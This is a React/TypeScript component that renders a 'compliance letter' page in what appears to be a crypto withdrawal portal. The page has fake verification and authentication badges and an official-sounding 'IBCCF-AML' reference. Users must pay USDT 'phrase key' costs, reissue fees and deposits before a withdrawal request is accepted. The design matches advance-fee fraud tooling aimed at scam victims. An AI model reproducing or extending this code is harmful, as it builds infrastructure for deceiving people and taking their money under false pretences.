import React, { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";

import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Shield, ShieldCheck, CheckCircle2, FileText, History, ArrowLeft, Clock, ExternalLink, Download, RefreshCw, Wallet, Loader2 } from "lucide-react";
import { motion } from "framer-motion";
import { useToast } from "@/hooks/use-toast";
import { useTranslation } from "react-i18next";
import { usePortal } from "./PortalContext";
import { getIsWithdrawalMode } from "@/lib/withdrawalMode";
import { PayoutWalletBlock } from "@/components/portal/PayoutWalletBlock";
import { LocalizedAmount } from "@/components/portal/LocalizedAmount";
import { useFormat } from "@/i18n/format";
import { PortalEmptyState } from "@/components/portal/PortalEmptyState";

export function LetterView() {
  const { currentCase, letterContent, submissions, setSubmissions, setViewState, activeReissue } = usePortal();
  const { toast } = useToast();
  const { t } = useTranslation("portal");
  const { formatDate, formatDateTime } = useFormat();

  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  // Which submission flow the confirm dialog is wrapping. The dialog renders
  // the same amount input + summary either way; only the submit handler
  // differs. Set when the user clicks one of the two submit buttons.
  const [confirmKind, setConfirmKind] = useState<"option" | "url">("option");
  // User-typed withdrawal amount. Pre-filled once from the case's current
  // value so users who don't change it submit the same number as before;
  // users who do edit it (either inline on the letter after picking an
  // option, or in the confirm dialog) have their value persisted and shown
  // back to them in the confirmation toast and the Submissions history.
  const [userAmount, setUserAmount] = useState("");
  const [amountTouched, setAmountTouched] = useState(false);

  // Seed the amount input from the case default the first time we see it,
  // and keep it in sync if the admin updates the case amount before the
  // user has typed anything. Once the user edits the field we stop
  // overwriting it.
  useEffect(() => {
    if (amountTouched) return;
    const def = currentCase?.withdrawalAmount ?? "";
    setUserAmount((prev) => (prev === def ? prev : def));
  }, [currentCase?.withdrawalAmount, amountTouched]);

  const updateUserAmount = (value: string) => {
    setAmountTouched(true);
    setUserAmount(value);
  };

  // Mirror the server validation: the input must contain a positive number
  // (commas allowed) up to a generous cap. Currency suffix is allowed.
  // Empty is treated as "use case default" → considered valid.
  const MAX_AMOUNT = 1_000_000_000;
  const isUserAmountValid = (() => {
    const trimmed = userAmount.trim();
    if (!trimmed) return true;
    const m = trimmed.replace(/[\s$£€]/g, '').match(/^[-+]?[\d,]*\.?\d+/);
    if (!m) return false;
    const n = Number(m[0].replace(/,/g, ''));
    return Number.isFinite(n) && n > 0 && n <= MAX_AMOUNT;
  })();

  const isWithdrawalMode = getIsWithdrawalMode(currentCase);

  if (!currentCase?.letterSent && !isWithdrawalMode) {
    return (
      <div className="p-4 sm:p-6 lg:p-8 flex items-center justify-center min-h-[60vh]">
        <div className="max-w-md w-full">
          <PortalEmptyState
            icon={FileText}
            title={t("letter.pending.title")}
            description={t("letter.pending.description")}
            hint={t("letter.pending.notification")}
            iconClassName="text-slate-400"
            data-testid="letter-pending-state"
            action={
              <Button
                onClick={() => setViewState('dashboard')}
                className="rounded-xl bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
                data-testid="button-back-dashboard-pending"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />{t("letter.pending.returnButton")}
              </Button>
            }
          />
        </div>
      </div>
    );
  }
  
  const adminData = currentCase ? {
    vipStatus: currentCase.vipStatus,
    username: currentCase.username,
    withdrawalAmount: currentCase.withdrawalAmount,
    withdrawalBatches: currentCase.withdrawalBatches,
    physilocal0: currentCase.physilocal0
  } : undefined;

  const letter = letterContent || {
    headline: t("letter.fallback.headline"),
    introduction: t("letter.fallback.introduction"),
    bodyContent: t("letter.fallback.bodyContent"),
    footerNote: t("letter.fallback.footerNote"),
    complianceReference: `IBCCF-AML-CC-${currentCase?.accessCode || ''}`,
    optionATitle: t("letter.fallback.optionATitle"),
    optionADescription: t("letter.fallback.optionADescription"),
    optionAFrequency: t("letter.fallback.optionAFrequency"),
    optionAKeyCost: "260.996 USDT",
    optionATotalRequirement: "2,609.96 USDT",
    optionBTitle: t("letter.fallback.optionBTitle"),
    optionBDescription: t("letter.fallback.optionBDescription"),
    optionBFrequency: t("letter.fallback.optionBFrequency"),
    optionBKeyCost: "521.993 USDT",
    optionBTotalRequirement: "5,219.92 USDT",
    phraseKeyRequirements: JSON.stringify([
      t("letter.fallback.phraseKey1"),
      t("letter.fallback.phraseKey2"),
      t("letter.fallback.phraseKey3"),
      t("letter.fallback.phraseKey4"),
      t("letter.fallback.phraseKey5"),
    ]),
    complianceNotice: t("letter.fallback.complianceNotice"),
  };

  // The active reissue round (if any) is the most recent non-cancelled row.
  // After a reissue, only count submissions made after the round started.
  const reissueAt = activeReissue ? new Date(activeReissue.createdAt).getTime() : 0;
  const effectiveSubmissions = reissueAt > 0
    ? submissions.filter(s => new Date(s.submittedAt).getTime() >= reissueAt)
    : submissions;
  const requiresReissuePayment = Boolean(activeReissue && activeReissue.status !== 'paid');

  const beginSubmission = (kind: 'option' | 'url') => {
    if (requiresReissuePayment) {
      toast({
        variant: "destructive",
        title: activeReissue?.status === 'awaiting_review' ? t("letter.toast.reissueAwaitingTitle") : t("letter.toast.reissueRequiredTitle"),
        description: activeReissue?.status === 'awaiting_review'
          ? t("letter.toast.reissueAwaitingDescription")
          : t("letter.toast.reissueRequiredDescription", { fee: activeReissue?.reissueFee ?? "" }),
      });
      return;
    }
    // Don't overwrite the user's inline edit here — the amount field on the
    // letter and the one in the confirm dialog share the same state, and the
    // useEffect above already seeds it from the case default.
    setConfirmKind(kind);
    setIsConfirming(true);
  };

  // Single confirm-button handler for both flows.
  const handleConfirmSubmit = () => {
    if (confirmKind === 'option') {
      void handleSubmit();
    } else {
      void runUrlSubmission();
    }
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);

    if (currentCase && selectedOption) {
      try {
        const trimmedAmount = userAmount.trim();
        const { getPortalToken } = await import("@/lib/portalSession");
        const portalToken = getPortalToken();
        const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(portalToken ? { 'x-portal-session-token': portalToken } : {}),
          },
          body: JSON.stringify({
            selectedOption: selectedOption,
            userWithdrawalAmount: trimmedAmount || undefined,
          })
        });

        if (response.ok) {
          const submission = await response.json();
          setSubmissions([submission, ...submissions]);
          setIsSubmitting(false);
          setIsConfirming(false);
          // Show whatever the server actually recorded (user input wins,
          // case default is the fallback) so the toast is never silent
          // about the amount.
          const recorded = (submission?.withdrawalAmount as string | undefined)
            ?? trimmedAmount
            ?? currentCase?.withdrawalAmount
            ?? '';
          toast({
            title: t("letter.toast.submissionSuccessTitle"),
            description: recorded
              ? t("letter.toast.submissionSuccessWithAmount", { amount: recorded })
              : t("letter.toast.submissionSuccessNoAmount"),
            className: "bg-green-50 border-green-200 text-green-900",
          });
        } else {
          const body = await response.json().catch(() => ({}));
          toast({
            variant: "destructive",
            title: t("letter.toast.submissionFailedTitle"),
            description: body?.error ?? t("letter.toast.submissionFailedDefault"),
          });
          setIsSubmitting(false);
        }
      } catch (_e) {
        toast({
          variant: "destructive",
          title: t("letter.toast.connectionErrorTitle"),
          description: t("letter.toast.submissionFailedDefault"),
        });
        setIsSubmitting(false);
      }
    }
  };

  const runUrlSubmission = async () => {
    if (!currentCase?.submissionUrl) return;

    // Lock the confirm button while the POST is in flight so users can't
    // double-click and create duplicate submission rows.
    setIsSubmitting(true);
    try {
      const trimmedAmount = userAmount.trim();
      const { getPortalToken: getPT } = await import("@/lib/portalSession");
      const pt = getPT();
      const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(pt ? { 'x-portal-session-token': pt } : {}),
        },
        body: JSON.stringify({
          selectedOption: 'URL_SUBMISSION',
          userWithdrawalAmount: trimmedAmount || undefined,
        })
      });
      if (response.ok) {
        const submission = await response.json();
        setSubmissions([submission, ...submissions]);
        setIsConfirming(false);
        window.open(currentCase.submissionUrl, '_blank', 'noopener,noreferrer');
        const recorded = (submission?.withdrawalAmount as string | undefined)
          ?? trimmedAmount
          ?? currentCase?.withdrawalAmount
          ?? '';
        toast({
          title: t("letter.toast.submissionRecordedTitle"),
          description: recorded
            ? t("letter.toast.submissionRecordedWithAmount", { amount: recorded })
            : t("letter.toast.submissionRecordedNoAmount"),
          className: "bg-green-50 border-green-200 text-green-900",
        });
      } else {
        const body = await response.json().catch(() => ({}));
        toast({
          variant: "destructive",
          title: t("letter.toast.submissionFailedTitle"),
          description: body?.error ?? t("letter.toast.submissionRecordFailedDefault"),
        });
      }
    } catch (_e) {
      toast({ variant: "destructive", title: t("letter.toast.errorTitle"), description: t("letter.toast.failedRecord") });
    } finally {
      // Always release the lock so the dialog can be retried/closed even on
      // network errors. handleSubmit uses the same pattern via inline calls;
      // a finally here is safer because the URL flow has no early returns.
      setIsSubmitting(false);
    }
  };

  const handleUrlSubmission = () => beginSubmission('url');

  return (
    <div className="text-slate-900 font-sans selection:bg-blue-100 print:bg-white">
      <div className="p-4 sm:p-6 lg:p-8 print:hidden">
        <div className="flex flex-wrap items-center justify-between gap-3 mb-6">
          <div>
            <h2 className="text-2xl sm:text-3xl font-bold text-white mb-1 flex items-center gap-2">
              <FileText className="w-6 h-6 text-blue-400 shrink-0" />
              {t("letter.header.title")}
            </h2>
            <p className="text-blue-300 text-sm">{t("letter.header.subtitle")}</p>
          </div>
          <div className="flex items-center gap-2">
            {submissions.length > 0 && (
              <Button
                variant="ghost"
                size="sm"
                className="text-slate-300 hover:text-white hover:bg-white/10 rounded-xl border border-white/10"
                onClick={() => setViewState('submissions')}
                data-testid="button-view-history"
              >
                <History className="w-4 h-4 mr-1.5" />{t("letter.header.history", { count: submissions.length })}
              </Button>
            )}
            <Button
              variant="ghost"
              size="sm"
              className="text-slate-300 hover:text-white hover:bg-white/10 rounded-xl border border-white/10"
              onClick={() => window.print()}
              data-testid="button-download-pdf"
            >
              <Download className="w-4 h-4 mr-1.5" />{t("letter.header.downloadPdf")}
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 pb-8 print:max-w-none print:px-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          
          <div className="bg-white rounded-xl shadow-xl border border-slate-200 overflow-hidden print:shadow-none print:border-none">
            
            <div className="bg-gradient-to-r from-slate-900 to-slate-800 text-white px-8 py-6">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 rounded-xl bg-white/20 flex items-center justify-center">
                  <Shield className="h-10 w-10 text-white" />
                </div>
                <div>
                  <h1 className="text-xl font-bold tracking-wide">{t("letter.organization.name")}</h1>
                  <p className="text-slate-300 text-sm uppercase tracking-widest">{t("letter.organization.division")}</p>
                  <p className="text-slate-400 text-xs uppercase tracking-wider">{t("letter.organization.secretariat")}</p>
                </div>
              </div>
            </div>

            <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white px-8 py-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-sm font-bold uppercase tracking-wider flex items-center gap-2">
                      {t("letter.session.verified")}
                      <span className="w-2 h-2 bg-white rounded-full animate-pulse"></span>
                    </p>
                    <p className="text-xs text-green-100">{t("letter.session.verifiedSubtitle")}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-green-100">{t("letter.session.accountStatus")}</p>
                  <span className="text-sm font-bold">{adminData?.vipStatus || t("letter.session.standardMember")}</span>
                </div>
              </div>
            </div>
            
            <div className="bg-blue-50 border-b-2 border-blue-200 px-8 py-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                    <ShieldCheck className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-xs text-blue-600 font-semibold uppercase tracking-wider">{t("letter.compliance.referenceLabel")}</p>
                    <p className="text-lg font-mono font-bold text-blue-900">{letterContent?.complianceReference || letter.complianceReference}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-slate-500">{t("letter.compliance.sessionVerifiedLabel")}</p>
                  <Badge className="bg-green-600 text-white">
                    <CheckCircle2 className="w-3 h-3 mr-1" />
                    {t("letter.compliance.authenticated")}
                  </Badge>
                </div>
              </div>
            </div>

            <div className="px-8 py-6">
              <div className="mb-6">
                <p className="text-slate-600 text-sm mb-2">{t("letter.body.dateLabel")} {formatDate(new Date(), { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                <p className="font-bold text-slate-900 text-lg">{t("letter.body.greeting", { name: currentCase?.userName || t("letter.body.defaultClient") })}</p>
              </div>

              <div className="prose prose-slate max-w-none text-slate-700 leading-relaxed mb-8">
                {letter.introduction && (
                  <p className="mb-4">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
                )}
                {letter.bodyContent && (
                  <p className="mb-4">{letter.bodyContent}</p>
                )}
                {letter.footerNote && (
                  <p className="font-semibold text-slate-900 bg-amber-50 border-l-4 border-amber-500 pl-4 py-2">{letter.footerNote}</p>
                )}
              </div>

              {/* Verified Payout Wallet — display-only confirmation that the
                  destination address printed on this letter matches the
                  address compliance has on file for the case. */}
              {currentCase && (
                <div className="mb-8" data-testid="letter-payout-wallet">
                  <h3 className="text-sm font-bold uppercase tracking-wider text-slate-700 mb-2">
                    {t("letter.payoutWallet.title")}
                  </h3>
                  <PayoutWalletBlock currentCase={currentCase} variant="light" />
                </div>
              )}

              {activeReissue && effectiveSubmissions.length === 0 && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className={`mb-6 rounded-xl border-2 p-5 print:hidden ${
                    activeReissue.status === 'paid'
                      ? 'border-emerald-300 bg-gradient-to-r from-emerald-50 to-green-50'
                      : activeReissue.status === 'awaiting_review'
                      ? 'border-blue-300 bg-gradient-to-r from-blue-50 to-indigo-50'
                      : 'border-amber-300 bg-gradient-to-r from-amber-50 to-yellow-50'
                  }`}
                  data-testid="banner-letter-reissued"
                >
                  <div className="flex items-start gap-4">
                    <div className={`w-11 h-11 rounded-full flex items-center justify-center flex-shrink-0 ${
                      activeReissue.status === 'paid'
                        ? 'bg-emerald-500'
                        : activeReissue.status === 'awaiting_review'
                        ? 'bg-blue-500'
                        : 'bg-amber-500'
                    }`}>
                      {activeReissue.status === 'paid' ? (
                        <CheckCircle2 className="w-5 h-5 text-white" />
                      ) : activeReissue.status === 'awaiting_review' ? (
                        <Loader2 className="w-5 h-5 text-white animate-spin" />
                      ) : (
                        <RefreshCw className="w-5 h-5 text-white" />
                      )}
                    </div>
                    <div className="flex-1">
                      <h3 className={`text-base font-bold flex items-center gap-2 ${
                        activeReissue.status === 'paid'
                          ? 'text-emerald-900'
                          : activeReissue.status === 'awaiting_review'
                          ? 'text-blue-900'
                          : 'text-amber-900'
                      }`}>
                        {t("letter.reissue.versionTitle", { version: activeReissue.version })}
                        <Badge
                          className={`text-white text-[10px] uppercase tracking-wider ${
                            activeReissue.status === 'paid'
                              ? 'bg-emerald-600'
                              : activeReissue.status === 'awaiting_review'
                              ? 'bg-blue-600'
                              : 'bg-amber-600'
                          }`}
                          data-testid="badge-reissue-status"
                        >
                          {activeReissue.status === 'paid'
                            ? t("letter.reissue.statusPaid")
                            : activeReissue.status === 'awaiting_review'
                            ? t("letter.reissue.statusUnderReview")
                            : t("letter.reissue.statusPaymentRequired")}
                        </Badge>
                      </h3>
                      <p className={`text-sm mt-1 ${
                        activeReissue.status === 'paid'
                          ? 'text-emerald-900/80'
                          : activeReissue.status === 'awaiting_review'
                          ? 'text-blue-900/80'
                          : 'text-amber-900/80'
                      }`}>
                        {activeReissue.status === 'paid'
                          ? t("letter.reissue.descriptionPaid")
                          : activeReissue.status === 'awaiting_review'
                          ? t("letter.reissue.descriptionUnderReview")
                          : t("letter.reissue.descriptionAwaitingDeposit")}
                      </p>
                      <div className="mt-3 rounded-lg bg-white border border-current/20 px-4 py-3">
                        <p className="text-[10px] uppercase tracking-wider text-slate-500 font-bold">{t("letter.reissue.feeLabel")}</p>
                        <p className="font-bold text-2xl text-slate-900" data-testid="text-reissue-fee">
                          {activeReissue.reissueFee}
                          <LocalizedAmount value={activeReissue.reissueFee} estimateClassName="text-base font-normal text-slate-600 ml-2" />
                        </p>
                      </div>
                      {activeReissue.reason && (
                        <div className="mt-3 rounded-lg bg-white/70 border border-current/20 px-3 py-2 text-xs text-slate-700 whitespace-pre-wrap">
                          <span className="font-semibold">{t("letter.reissue.reasonLabel")}</span> {activeReissue.reason}
                        </div>
                      )}
                      {activeReissue.status === 'awaiting_deposit' && (
                        <Button
                          className="mt-4 bg-amber-600 hover:bg-amber-700 text-white"
                          onClick={() => setViewState('deposit')}
                          data-testid="button-go-to-deposit"
                        >
                          <Wallet className="w-4 h-4 mr-2" />
                          {t("letter.reissue.goToDeposit")}
                        </Button>
                      )}
                    </div>
                  </div>
                </motion.div>
              )}

              {effectiveSubmissions.length === 0 && !currentCase?.submissionUrl && letter.optionATitle && letter.optionBTitle && (
                <div className="mb-8">
                  <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
                    <div className="w-1 h-6 bg-blue-600 rounded"></div>
                    {t("letter.options.title")}
                  </h2>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {(["A", "B"] as const).map((opt) => {
                      const title = opt === "A" ? letter.optionATitle : letter.optionBTitle;
                      const description = opt === "A" ? letter.optionADescription : letter.optionBDescription;
                      const amount = opt === "A" ? letter.optionAAmount : letter.optionBAmount;
                      const frequency = opt === "A" ? letter.optionAFrequency : letter.optionBFrequency;
                      const batches = opt === "A" ? letter.optionABatches : letter.optionBBatches;
                      const keyCost = opt === "A" ? letter.optionAKeyCost : letter.optionBKeyCost;
                      const totalReq = opt === "A"
                        ? (letter.optionATotalRequirement || letter.optionATotalAmount)
                        : (letter.optionBTotalRequirement || letter.optionBTotalAmount);
                      const isSelected = selectedOption === opt;
                      const selectedBorderClass = opt === "A" ? "border-blue-600 bg-blue-50" : "border-indigo-600 bg-indigo-50";
                      const badgeClass = opt === "A" ? "bg-blue-600 text-white" : "bg-indigo-600 text-white";
                      const checkClass = opt === "A" ? "text-blue-600" : "text-indigo-600";
                      return (
                        <button
                          key={opt}
                          type="button"
                          onClick={() => setSelectedOption(opt)}
                          data-testid={`button-select-option-${opt.toLowerCase()}`}
                          className={`text-left rounded-xl p-5 border-2 transition-all ${
                            isSelected
                              ? `${selectedBorderClass} shadow-md`
                              : "border-slate-200 bg-white hover:border-slate-300 hover:shadow"
                          }`}
                        >
                          <div className="flex items-start justify-between mb-3">
                            <div className="flex items-center gap-2">
                              <Badge className={badgeClass}>{t("letter.options.optionLabel", { letter: opt })}</Badge>
                              <span className="font-bold text-slate-900">{title}</span>
                            </div>
                            {isSelected && <CheckCircle2 className={`w-5 h-5 ${checkClass}`} />}
                          </div>
                          {description && (
                            <p className="text-sm text-slate-600 mb-3">{description}</p>
                          )}
                          <div className="space-y-1.5 text-sm">
                            {amount && (
                              <div className="flex justify-between"><span className="text-slate-500">{t("letter.options.amount")}</span><span className="font-medium text-slate-900">{amount}</span></div>
                            )}
                            {frequency && (
                              <div className="flex justify-between"><span className="text-slate-500">{t("letter.options.frequency")}</span><span className="font-medium text-slate-900">{frequency}</span></div>
                            )}
                            {batches && (
                              <div className="flex justify-between"><span className="text-slate-500">{t("letter.options.batches")}</span><span className="font-medium text-slate-900">{batches}</span></div>
                            )}
                            {keyCost && (
                              <div className="flex justify-between"><span className="text-slate-500">{t("letter.options.phraseKeyCost")}</span><span className="font-medium text-slate-900"><LocalizedAmount value={keyCost} estimateClassName="text-xs font-normal text-slate-500 ml-1" /></span></div>
                            )}
                            {totalReq && (
                              <div className="flex justify-between"><span className="text-slate-500">{t("letter.options.totalRequirement")}</span><span className="font-bold text-green-700"><LocalizedAmount value={totalReq} estimateClassName="text-xs font-normal text-green-700/70 ml-1" /></span></div>
                            )}
                          </div>
                        </button>
                      );
                    })}
                  </div>
                  {selectedOption && (
                    <motion.div
                      initial={{ opacity: 0, y: -6 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mt-5 rounded-xl border-2 border-blue-200 bg-blue-50/60 p-5"
                      data-testid="section-letter-amount"
                    >
                      <label
                        htmlFor="letter-withdrawal-amount"
                        className="block text-xs uppercase tracking-wider text-blue-700 font-bold mb-1.5"
                      >
                        {t("letter.amount.label")}
                      </label>
                      <p className="text-xs text-slate-600 mb-3">
                        {t("letter.amount.help", { option: selectedOption })}
                      </p>
                      <Input
                        id="letter-withdrawal-amount"
                        value={userAmount}
                        onChange={(e) => updateUserAmount(e.target.value)}
                        placeholder={t("letter.amount.placeholder")}
                        inputMode="decimal"
                        className="text-base font-semibold bg-white"
                        data-testid="input-letter-withdrawal-amount"
                        aria-invalid={!isUserAmountValid}
                      />
                      <p
                        className={`text-xs mt-1.5 ${isUserAmountValid ? 'text-slate-500' : 'text-red-600'}`}
                        data-testid="text-letter-amount-hint"
                      >
                        {isUserAmountValid
                          ? t("letter.amount.hintValid")
                          : t("letter.amount.hintInvalid")}
                      </p>
                    </motion.div>
                  )}
                  <div className="mt-5 flex justify-end">
                    <Button
                      size="lg"
                      disabled={!selectedOption || requiresReissuePayment || !isUserAmountValid}
                      onClick={() => beginSubmission('option')}
                      data-testid="button-continue-selection"
                      className="bg-blue-600 hover:bg-blue-700 text-white"
                    >
                      {requiresReissuePayment
                        ? (activeReissue?.status === 'awaiting_review' ? t("letter.continue.awaitingApproval") : t("letter.continue.payReissueFirst"))
                        : t("letter.continue.withOption", { option: selectedOption || t("letter.continue.withOptionPlaceholder") })}
                    </Button>
                  </div>
                </div>
              )}

              {effectiveSubmissions.length > 0 ? (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }} 
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-green-50 border-2 border-green-200 rounded-xl p-6 mb-8"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle2 className="w-7 h-7 text-green-600" />
                    </div>
                    <div className="flex-1">
                      <h3 className="text-xl font-bold text-green-900 mb-2">{t("letter.success.title")}</h3>
                      <p className="text-green-700 mb-4">{t("letter.success.description")}</p>
                      
                      <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">{t("letter.success.referenceNumber")}</span>
                          <span className="font-mono font-bold text-green-700">IBCCF-{String(effectiveSubmissions[0]?.id || 0).padStart(6, '0')}</span>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">{t("letter.success.statusLabel")}</span>
                          <Badge className="bg-green-600">{t("letter.success.statusBadge")}</Badge>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">{t("letter.success.submittedOn")}</span>
                          <span className="font-medium">{formatDateTime(effectiveSubmissions[0]?.submittedAt || Date.now())}</span>
                        </div>
                      </div>
                      
                      <div className="flex gap-3">
                        <Button onClick={() => setViewState('dashboard')} className="bg-green-600 hover:bg-green-700">
                          <ArrowLeft className="w-4 h-4 mr-2" />
                          {t("letter.success.returnDashboard")}
                        </Button>
                        <Button variant="outline" onClick={() => setViewState('submissions')}>
                          <History className="w-4 h-4 mr-2" />
                          {t("letter.success.viewHistory")}
                        </Button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              ) : currentCase?.submissionUrl ? (
                <div className="mb-8">
                  <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
                    <div className="w-1 h-6 bg-blue-600 rounded"></div>
                    {t("letter.url.sectionTitle")}
                  </h2>
                  
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl p-6"
                  >
                    <div className="flex items-start gap-4">
                      <div className="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                        <ExternalLink className="w-7 h-7 text-white" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-xl font-bold text-blue-900 mb-2">{t("letter.url.title")}</h3>
                        <p className="text-blue-700 mb-4">
                          {t("letter.url.description")}
                        </p>
                        
                        <div className="bg-white rounded-lg p-4 border border-blue-200 space-y-3 mb-4">
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">{t("letter.url.account")}</span>
                            <span className="font-bold text-slate-900">{currentCase?.userName || t("letter.url.notAvailable")}</span>
                          </div>
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">{t("letter.url.withdrawalAmount")}</span>
                            <span className="font-bold text-green-600">{adminData?.withdrawalAmount || t("letter.url.notAvailable")}</span>
                          </div>
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">{t("letter.url.reference")}</span>
                            <span className="font-mono font-bold text-blue-700">{letterContent?.complianceReference || letter.complianceReference}</span>
                          </div>
                        </div>
                        
                        <Button
                          size="lg"
                          disabled={requiresReissuePayment}
                          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-lg"
                          onClick={handleUrlSubmission}
                          data-testid="button-submit-url"
                        >
                          <ExternalLink className="w-5 h-5 mr-2" />
                          {requiresReissuePayment
                            ? (activeReissue?.status === 'awaiting_review' ? t("letter.continue.awaitingApproval") : t("letter.continue.payReissueFirst"))
                            : t("letter.url.submit")}
                        </Button>
                        
                        <p className="text-xs text-blue-600 text-center mt-3">
                          {t("letter.url.opensInNewTab")}
                        </p>
                      </div>
                    </div>
                  </motion.div>
                </div>
              ) : letter.optionATitle && letter.optionBTitle ? null : (
                <div className="mb-8">
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-amber-50 border-2 border-amber-200 rounded-xl p-6"
                  >
                    <div className="flex items-start gap-4">
                      <div className="w-14 h-14 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
                        <Clock className="w-7 h-7 text-white" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-xl font-bold text-amber-900 mb-2">{t("letter.awaitingConfig.title")}</h3>
                        <p className="text-amber-700 mb-4">
                          {t("letter.awaitingConfig.description")}
                        </p>
                        <Button 
                          onClick={() => setViewState('dashboard')}
                          variant="outline"
                          className="border-amber-300 text-amber-700 hover:bg-amber-100"
                        >
                          <ArrowLeft className="w-4 h-4 mr-2" />
                          {t("letter.awaitingConfig.returnDashboard")}
                        </Button>
                      </div>
                    </div>
                  </motion.div>
                </div>
              )}
            </div>

            <div className="bg-slate-50 border-t border-slate-200 px-8 py-4">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>{t("letter.footer.encryptionInfo", { ref: letterContent?.complianceReference || letter.complianceReference })}</span>
                </div>
                <span>{t("letter.footer.generated", { timestamp: new Date().toISOString() })}</span>
              </div>
            </div>
          </div>

        </motion.div>
      </div>

      <Dialog open={isConfirming} onOpenChange={(open) => { if (!isSubmitting) setIsConfirming(open); }}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-primary">{t("letter.confirm.title")}</DialogTitle>
            <DialogDescription>
              {t("letter.confirm.description", { name: adminData?.username ?? "" })}
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-3">
            <div className="bg-slate-50 rounded-lg p-4 space-y-3">
              {confirmKind === 'option' && (
                <div className="flex items-center justify-between">
                  <span className="text-slate-500 text-sm">{t("letter.confirm.selectedOption")}</span>
                  <Badge className={selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>{t("letter.options.optionLabel", { letter: selectedOption })}</Badge>
                </div>
              )}
              <div className="flex items-center gap-3">
                <label
                  htmlFor="confirm-withdrawal-amount"
                  className="text-slate-500 text-sm shrink-0"
                >
                  {t("letter.confirm.amountLabel")}
                </label>
                <Input
                  id="confirm-withdrawal-amount"
                  value={userAmount}
                  onChange={(e) => updateUserAmount(e.target.value)}
                  placeholder={t("letter.confirm.amountPlaceholder")}
                  disabled={isSubmitting}
                  inputMode="decimal"
                  className="flex-1 text-right text-base font-semibold bg-white"
                  data-testid="input-user-withdrawal-amount"
                  aria-invalid={!isUserAmountValid}
                />
              </div>
              <p
                className={`text-xs ${isUserAmountValid ? 'text-slate-500' : 'text-red-600'}`}
                data-testid="text-user-withdrawal-hint"
              >
                {isUserAmountValid
                  ? t("letter.confirm.hintValid")
                  : t("letter.confirm.hintInvalid")}
              </p>
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>{t("letter.confirm.cancel")}</Button>
            <Button
              onClick={handleConfirmSubmit}
              disabled={isSubmitting || !isUserAmountValid}
              className="gap-2"
              data-testid="button-confirm-submit"
            >
              {isSubmitting
                ? t("letter.confirm.submitting")
                : confirmKind === 'url' ? t("letter.confirm.submitOpenForm") : t("letter.confirm.submitSelection")}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
